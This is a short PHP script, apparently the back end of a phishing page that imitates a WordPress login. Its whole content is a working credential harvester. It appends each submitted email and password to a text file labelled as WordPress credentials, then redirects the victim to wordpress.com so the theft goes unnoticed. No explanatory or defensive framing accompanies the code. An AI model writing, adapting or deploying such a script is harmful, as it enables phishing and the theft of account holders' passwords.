<?php 
file_put_contents("usernames.txt", "Wordpress Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://wordpress.com');
exit();
?>
